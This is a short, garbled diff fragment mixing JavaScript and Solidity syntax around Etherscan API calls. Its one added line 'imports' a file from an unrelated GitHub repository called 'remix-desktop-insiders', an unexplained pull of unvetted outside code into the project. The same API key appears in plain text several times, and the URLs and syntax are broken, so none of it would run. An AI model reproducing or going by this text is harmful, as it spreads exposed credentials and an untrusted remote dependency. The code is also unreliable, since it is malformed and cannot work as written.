@@ -83,6 +83,7 @@ for (const chain of chains) {
      &tag=latest&apikey=E4XQS66QJYPBM6ZPIUU3EH9B37NZB5XG7K
      
 }
+import https://github.com/Wesley-tec2/remix-desktop-insiders/blob/main/ADvt2
 import 
 https://https://etherscan.io/myapikey_logs?apikey=E4XQS66QJYPBM6ZPIUU3EH9B37NZB5XG7K?chainid=1 &module=stats &action=tokensupply &contractaddress=0x1563F4EaD498EA931bb2CD2DbC3Ae2b8b516FBde &apikey=E4XQS66QJYPBM6ZPIUU3EH9B37NZB5XG7K
 function interactWithContract(address contractAddress) public {
